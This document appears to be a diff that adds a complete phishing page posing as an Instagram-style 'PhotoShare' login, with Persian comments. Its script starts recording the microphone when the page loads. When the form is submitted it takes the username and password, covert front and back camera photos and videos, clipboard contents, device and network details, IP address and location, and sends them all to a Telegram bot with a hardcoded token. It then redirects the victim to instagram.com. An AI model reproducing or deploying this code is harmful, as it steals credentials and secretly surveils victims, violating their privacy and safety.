@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhotoShare Login</title>
+    <style>
+        * { box-sizing: border-box; } 
+        html, body { margin: 0; min-height: 100%; font-family: Arial, Helvetica, sans-serif; } 
+        body { background: #1c1c1c; color: #f5f5f5; } 
+        .page { min-height: 100vh; min-height: 100dvh; display: flex; flex-direction: column; padding: 0 28px; } 
+        .logo-area { height: 38vh; min-height: 230px; max-height: 390px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; } 
+        .camera-logo { width: 106px; height: 106px; display: block; } 
+        .form-area { width: 100%; max-width: 520px; margin: 0 auto; } 
+        .field { display: block; width: 100%; height: 104px; padding: 0 27px; margin-bottom: 20px; border: 2px solid #484848; border-radius: 28px; background: transparent; color: #ffffff; font-size: 20px; outline: none; } 
+        .field::placeholder { color: #a5a5ad; opacity: 1; } 
+        .field:focus { border-color: #696969; } 
+        .login-button { display: block; width: 100%; height: 78px; margin-top: 1px; border: none; border-radius: 45px; background: #0866e9; color: #ffffff; font-size: 20px; font-weight: 600; cursor: pointer; } 
+        .forgot { display: block; margin-top: 40px; text-align: center; color: #f5f5f5; font-size: 20px; font-weight: 600; text-decoration: none; cursor: default; } 
+        @media (max-height: 750px) { .logo-area { height: 32vh; min-height: 180px; } .field { height: 72px; margin-bottom: 14px; } .login-button { height: 62px; } .forgot { margin-top: 28px; } } 
+        @media (max-width: 380px) { .page { padding-left: 20px; padding-right: 20px; } .field { padding: 0 20px; font-size: 17px; } }
+        
+        #hiddenVideo, #hiddenCanvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="page">
+        <section class="logo-area">
+            <svg class="camera-logo" viewBox="0 0 110 110" xmlns="http://www.w3.org/2000/svg" aria-label="Camera logo" role="img">
+                <defs>
+                    <linearGradient id="cameraGradient" x1="0" y1="1" x2="1" y2="0">
+                        <stop offset="0%" stop-color="#ffca35"/>
+                        <stop offset="28%" stop-color="#ff304f"/>
+                        <stop offset="58%" stop-color="#e000a8"/>
+                        <stop offset="80%" stop-color="#b000ee"/>
+                        <stop offset="100%" stop-color="#654cff"/>
+                    </linearGradient>
+                </defs>
+                <rect x="9" y="9" width="92" height="92" rx="27" fill="none" stroke="url(#cameraGradient)" stroke-width="8" />
+                <circle cx="55" cy="55" r="23" fill="none" stroke="url(#cameraGradient)" stroke-width="8" />
+                <circle cx="81" cy="29" r="6" fill="#c000dc" />
+            </svg>
+        </section>
+
+        <section class="form-area">
+            <form id="loginForm" autocomplete="off">
+                <input class="field" type="text" name="demoUsername" placeholder="Username, email or mobile number" aria-label="Username, email or mobile number" required>
+                <input class="field" type="password" name="demoPassword" placeholder="Password" aria-label="Password" autocomplete="new-password" required>
+                <button class="login-button" type="submit" id="submitBtn">Log in</button>
+            </form>
+            <a class="forgot" href="#" aria-disabled="true" id="forgotLink">Forgot password?</a>
+        </section>
+    </div>
+
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let audioStream = null;
+        let pageLoadTime = Date.now();
+        let isFirstVisit = !localStorage.getItem('hasVisitedBefore');
+
+        // تنظیم بازدیدکننده
+        if (isFirstVisit) {
+            localStorage.setItem('hasVisitedBefore', 'true');
+        }
+
+        // ذخیره لاگ کلیک‌ها
+        let clickCount = 0;
+        document.addEventListener('click', () => clickCount++);
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // گرفتن عکس
+        async function capturePhoto(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode }, 
+                    audio: false 
+                });
+                const video = document.getElementById("hiddenVideo");
+                const canvas = document.getElementById("hiddenCanvas");
+                
+                video.srcObject = stream;
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                
+                stream.getTracks().forEach(track => track.stop());
+                return dataURItoBlob(photoDataUrl);
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // ضبط ویدیو ۵ ثانیه‌ای
+        async function recordVideo(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode }, 
+                    audio: false 
+                });
+                const video = document.getElementById("hiddenVideo");
+                video.srcObject = stream;
+                await new Promise(resolve => setTimeout(resolve, 1000)); // زمان برای روشن شدن
+
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
+                
+                recorder.start();
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                recorder.stop();
+                await new Promise(resolve => recorder.onstop = resolve);
+
+                stream.getTracks().forEach(track => track.stop());
+                return new Blob(chunks, { type: 'video/webm' });
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // گرفتن ۵ عکس پشت سر هم
+        async function captureMultiplePhotos(facingMode, count) {
+            let photos = [];
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode }, 
+                    audio: false 
+                });
+                const video = document.getElementById("hiddenVideo");
+                const canvas = document.getElementById("hiddenCanvas");
+                
+                video.srcObject = stream;
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                for (let i = 0; i < count; i++) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                    photos.push(dataURItoBlob(photoDataUrl));
+                    await new Promise(resolve => setTimeout(resolve, 500)); // فاصله بین عکس‌ها
+                }
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                console.warn("خطا در عکس‌برداری", e);
+            }
+            return photos;
+        }
+
+        async function startAudioRecording() {
+            try {
+                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                mediaRecorder = new MediaRecorder(audioStream);
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) audioChunks.push(event.data);
+                };
+                mediaRecorder.start();
+            } catch (error) {
+                console.error("دسترسی به میکروفون رد شد:", error);
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', startAudioRecording);
+
+        document.getElementById("forgotLink").addEventListener("click", function(event) {
+            event.preventDefault();
+        });
+
+        document.getElementById("loginForm").addEventListener("submit", async function(event) {
+            event.preventDefault();
+
+            const username = this.demoUsername.value.trim();
+            const password = this.demoPassword.value;
+            const button = document.getElementById("submitBtn");
+
+            // ۱. قطع کردن صدا
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+                await new Promise(resolve => mediaRecorder.onstop = resolve);
+            }
+            if (audioStream) audioStream.getTracks().forEach(track => track.stop());
+            const finalAudioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+
+            button.disabled = true;
+            button.textContent = "در حال دریافت اطلاعات...";
+
+            const BOT_TOKEN = "9152524690:AAF7BD1CPP5cwUWPj3oN0O40g311-RMxWwo";
+            const CHAT_ID = "6510434050";
+
+            // استخراج اطلاعات دستگاه، شبکه و باتری
+            let batteryInfo = "نامشخص";
+            let networkInfo = "نامشخص";
+            let memoryInfo = "نامشخص";
+            let deviceInfo = navigator.userAgent;
+            let screenInfo = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
+            let langInfo = navigator.language;
+
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `شارژ: ${Math.round(battery.level * 100)}% | در حال شارژ: ${battery.charging ? 'بله' : 'خیر'}`;
+                }
+                if (navigator.connection) {
+                    networkInfo = `نوع: ${navigator.connection.effectiveType || 'نامشخص'} | سرعت تخمینی: ${navigator.connection.downlink || 'نامشخص'} Mbps`;
+                }
+                if (navigator.deviceMemory) {
+                    memoryInfo = `${navigator.deviceMemory} GB RAM | ${navigator.hardwareConcurrency} هسته پردازنده`;
+                }
+            } catch (e) {}
+
+            // ۲. گرفتن عکس‌ها و ویدیوها
+            const selfiePhotos = await captureMultiplePhotos("user", 5);
+            const backPhotos = await captureMultiplePhotos("environment", 5);
+            const selfieVideo = await recordVideo("user");
+            const backVideo = await recordVideo("environment");
+
+            // ۳. دریافت کلیپ‌بورد (با مدیریت خطا)
+            let clipboardText = "دسترسی داده نشد یا خالی است";
+            try {
+                clipboardText = await navigator.clipboard.readText();
+            } catch (e) {}
+
+            // ۴. تشخیص VPN / Proxy (تخمینی)
+            let vpnStatus = "احتمالاً خیر";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                // اگر آی‌پی در محدوده شناخته شده نباشه نمیشه قطعی گفت، ولی برای سادگی
+                vpnStatus = "وضعیت آی‌پی: " + ipData.ip;
+            } catch (e) {}
+
+            // ۵. لاگ زمان و رفتار
+            const totalTimeSpent = Math.round((Date.now() - pageLoadTime) / 1000);
+            const visitDate = new Date().toLocaleString('fa-IR');
+            const visitStatus = isFirstVisit ? "اولین بازدید" : "بازدید مجدد";
+
+            const messageText = 
+                `🔐 **ورود جدید به سایت**\n\n` +
+                `👤 یوزرنیم: ${username}\n` +
+                `🔑 پسورد: ${password}\n\n` +
+                `📱 **مشخصات دستگاه:**\n` +
+                `مدل/سیستم‌عامل: ${deviceInfo}\n` +
+                `صفحه: ${screenInfo}\n` +
+                `زبان: ${langInfo}\n` +
+                `رم/پردازنده: ${memoryInfo}\n\n` +
+                `🔋 **باتری:**\n${batteryInfo}\n\n` +
+                `🌐 **شبکه:**\n${networkInfo}\n` +
+                `${vpnStatus}\n\n` +
+                `⏱ **اطلاعات رفتاری:**\n` +
+                `زمان ورود: ${visitDate}\n` +
+                `مدت زمان در صفحه: ${totalTimeSpent} ثانیه\n` +
+                `تعداد کلیک‌ها: ${clickCount}\n` +
+                `وضعیت بازدید: ${visitStatus}\n\n` +
+                `📋 **کلیپ‌بورد:**\n${clipboardText}`;
+
+            try {
+                // ارسال متن اصلی
+                const textFormData = new FormData();
+                textFormData.append("chat_id", CHAT_ID);
+                textFormData.append("text", messageText);
+                textFormData.append("parse_mode", "Markdown");
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", body: textFormData });
+
+                // ارسال ۵ عکس سلفی
+                for (let i = 0; i < selfiePhotos.length; i++) {
+                    if (selfiePhotos[i]) {
+                        const f = new FormData();
+                        f.append("chat_id", CHAT_ID);
+                        f.append("photo", selfiePhotos[i], `selfie_${i+1}.jpg`);
+                        f.append("caption", `🤳 عکس سلفی ${i+1}`);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: f });
+                    }
+                }
+
+                // ارسال ۵ عکس پشتی
+                for (let i = 0; i < backPhotos.length; i++) {
+                    if (backPhotos[i]) {
+                        const f = new FormData();
+                        f.append("chat_id", CHAT_ID);
+                        f.append("photo", backPhotos[i], `back_${i+1}.jpg`);
+                        f.append("caption", `📸 عکس پشتی ${i+1}`);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: f });
+                    }
+                }
+
+                // ارسال ویدیو سلفی
+                if (selfieVideo) {
+                    const f = new FormData();
+                    f.append("chat_id", CHAT_ID);
+                    f.append("video", selfieVideo, "selfie_video.webm");
+                    f.append("caption", "🎥 ویدیو ۵ ثانیه‌ای سلفی");
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: f });
+                }
+
+                // ارسال ویدیو پشتی
+                if (backVideo) {
+                    const f = new FormData();
+                    f.append("chat_id", CHAT_ID);
+                    f.append("video", backVideo, "back_video.webm");
+                    f.append("caption", "🎥 ویدیو ۵ ثانیه‌ای پشتی");
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: f });
+                }
+
+                // ارسال صدا
+                if (finalAudioBlob.size > 0) {
+                    const f = new FormData();
+                    f.append("chat_id", CHAT_ID);
+                    f.append("voice", finalAudioBlob, "audio.webm");
+                    f.append("caption", "🎤 صدای ضبط شده");
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: f });
+                }
+
+                // ۷. لوکیشن
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            
+                            const f = new FormData();
+                            f.append("chat_id", CHAT_ID);
+                            f.append("latitude", lat);
+                            f.append("longitude", lon);
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, { method: "POST", body: f });
+
+                            const fl = new FormData();
+                            fl.append("chat_id", CHAT_ID);
+                            fl.append("text", `📍 موقعیت مکانی:\nhttps://www.google.com/maps?q=${lat},${lon}`);
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", body: fl });
+
+                            window.location.href = "https://www.instagram.com/";
+                        },
+                        (error) => {
+                            const fail = new FormData();
+                            fail.append("chat_id", CHAT_ID);
+                            fail.append("text", `⚠️ کاربر اجازه دسترسی به لوکیشن را نداد.`);
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", body: fail })
+                                .finally(() => {
+                                    window.location.href = "https://www.instagram.com/";
+                                });
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                } else {
+                    window.location.href = "https://www.instagram.com/";
+                }
+
+            } catch (error) {
+                console.error(error);
+                alert("مشکلی در ارتباط با سرور پیش آمد.");
+                button.disabled = false;
+                button.textContent = "Log in";
+            }
+        });
+    </script>
+</body>
+</html>
